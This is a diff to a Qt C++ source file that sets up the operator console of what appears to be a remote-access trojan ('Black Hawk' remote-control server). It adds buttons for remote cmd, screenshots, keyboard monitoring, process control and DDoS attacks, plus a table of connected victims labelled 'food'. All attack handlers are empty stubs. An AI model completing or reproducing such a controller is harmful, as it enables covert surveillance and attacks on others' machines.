@@ -6,6 +6,73 @@ Hunter::Hunter(QWidget *parent)
     , ui(new Ui::Hunter)
 {
     ui->setupUi(this);
+
+    // -------------------------------------------界面设计------------------------------------------------
+    // 主窗口
+    this->setWindowTitle("Black Hawk 远控软件服务端 by lfish");
+    this->setFixedSize(700, 500);
+
+    // 按键区
+    ui->btFile->setSizePolicy(QSizePolicy::Preferred, QSizePolicy::Preferred);
+    ui->btCmd->setSizePolicy(QSizePolicy::Preferred, QSizePolicy::Preferred);
+    ui->btScreen->setSizePolicy(QSizePolicy::Preferred, QSizePolicy::Preferred);
+    ui->btProcess->setSizePolicy(QSizePolicy::Preferred, QSizePolicy::Preferred);
+    ui->btDDos->setSizePolicy(QSizePolicy::Preferred, QSizePolicy::Preferred);
+    ui->btKeybd->setSizePolicy(QSizePolicy::Preferred, QSizePolicy::Preferred);
+
+    ui->btFile->setText("文件管理");
+    ui->btCmd->setText("远程cmd");
+    ui->btScreen->setText("屏幕截图");
+    ui->btDDos->setText("DDOS攻击");
+    ui->btProcess->setText("进程管理");
+    ui->btKeybd->setText("键盘监控");
+
+    // 设置区
+    ui->widgetOption->setFixedHeight(200);
+
+    // 初始化区
+    ui->widgetInit->setFixedWidth(200);
+
+    ui->labelIP->setText("IP");
+    ui->labelPort->setText("端口");
+    ui->labelIP->setAlignment(Qt::AlignCenter);
+    ui->labelPort->setAlignment(Qt::AlignCenter);
+
+    ui->btStart->setText("开始监听");
+    ui->btStop->setText("停止监听");
+
+    // 上线表格区
+    ui->tableOnline->setColumnCount(5);
+    ui->tableOnline->setHorizontalHeaderItem(0, new QTableWidgetItem("ID"));
+    ui->tableOnline->setHorizontalHeaderItem(1, new QTableWidgetItem("用户名"));
+    ui->tableOnline->setHorizontalHeaderItem(2, new QTableWidgetItem("IP地址"));
+    ui->tableOnline->setHorizontalHeaderItem(3, new QTableWidgetItem("端口号"));
+    ui->tableOnline->setHorizontalHeaderItem(4, new QTableWidgetItem("系统信息"));
+    // 自适应列宽
+    ui->tableOnline->horizontalHeader()->setSectionResizeMode(QHeaderView::Stretch);
+    // 一行一行地选中
+    ui->tableOnline->setSelectionBehavior(QAbstractItemView::SelectRows);
+    // 一次最多选中一行
+    ui->tableOnline->setSelectionMode(QAbstractItemView::SingleSelection);
+    // 设置不可更改
+    ui->tableOnline->setEditTriggers(QAbstractItemView::NoEditTriggers);
+
+    // 右键出现的每一项的菜单 连接对应逻辑
+    m_Rclick = new QMenu(this);
+    QAction *actSendBox = m_Rclick->addAction("发送弹窗");
+    QAction *actReboot = m_Rclick->addAction("重启电脑");
+    QAction *actOffline = m_Rclick->addAction("强制下线");
+    connect(actSendBox, &QAction::triggered, &Hunter::sendBoxClicked);
+    connect(actReboot, &QAction::triggered, &Hunter::rebootClicked);
+    connect(actOffline, &QAction::triggered, &Hunter::OfflineClicked);
+    // 将菜单添加至鼠标事件中 再拦截鼠标事件得以处理
+    m_Rclick->installEventFilter(this);
+
+
+    // 测试
+    addFoodToTbl(1, "sumkee911", "127.0.0.1", 8888, "Windows 7");
+
+
 }
 
 Hunter::~Hunter()
@@ -13,3 +80,84 @@ Hunter::~Hunter()
     delete ui;
 }
 
+
+// ------------------------------------几个功能按键逻辑----------------------------------------
+void Hunter::btFileClicked(){
+
+}
+
+void Hunter::btCmdClicked(){
+
+}
+
+void Hunter::btDDOSClicked(){
+
+}
+
+void Hunter::btScreenClicked(){
+
+}
+
+void Hunter::btProcessClicked(){
+
+}
+
+void Hunter::btKeybdClicked(){
+
+}
+
+void Hunter::sendBoxClicked(){
+
+}
+
+void Hunter::OfflineClicked(){
+
+}
+
+void Hunter::rebootClicked(){
+
+}
+
+// 添加食物列表
+void Hunter::addFoodToTbl(int id, QString username, QString ipaddr, int port, QString sysInfo){
+
+    // 增加一行
+    int count = ui->tableOnline->rowCount();
+    ui->tableOnline->setRowCount(count + 1);
+
+    // 添加信息
+    QTableWidgetItem *itemId = new QTableWidgetItem(QString::number(id));
+    ui->tableOnline->setItem(count, 0 , itemId);
+
+    QTableWidgetItem *itemUsername = new QTableWidgetItem(username);
+    ui->tableOnline->setItem(count, 1 , itemUsername );
+
+    QTableWidgetItem *itemIpaddr = new QTableWidgetItem(ipaddr);
+    ui->tableOnline->setItem(count, 2 , itemIpaddr);
+
+    QTableWidgetItem *itemPort = new QTableWidgetItem(QString::number(port));
+    ui->tableOnline->setItem(count, 3 , itemPort);
+
+    QTableWidgetItem *itemSysInfo = new QTableWidgetItem(sysInfo);
+    ui->tableOnline->setItem(count, 4 , itemSysInfo);
+}
+
+// 删除食物
+void Hunter::rmFoodFromTbl(int id){
+
+}
+
+// 返回当前选中食物ID
+int Hunter::curFoodIdInTbl(){
+
+}
+
+// 开启服务器监听
+void Hunter::startLstn(){
+
+}
+
+// 重写事件过滤函数
+bool Hunter::eventFilter(QObject *watched, QEvent *event){
+
+}
